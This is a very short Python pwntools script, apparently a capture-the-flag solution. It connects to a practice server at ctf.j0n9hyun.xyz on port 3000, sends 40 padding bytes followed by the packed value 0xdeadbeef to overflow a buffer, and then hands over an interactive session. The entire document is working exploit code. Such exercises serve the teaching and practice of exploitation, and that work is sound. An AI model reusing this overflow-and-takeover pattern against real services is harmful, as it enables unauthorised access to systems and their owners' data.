#/usr/bin/python

from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3000)

p.send("A"*40+p32(0xdeadbeef))

p.interactive()

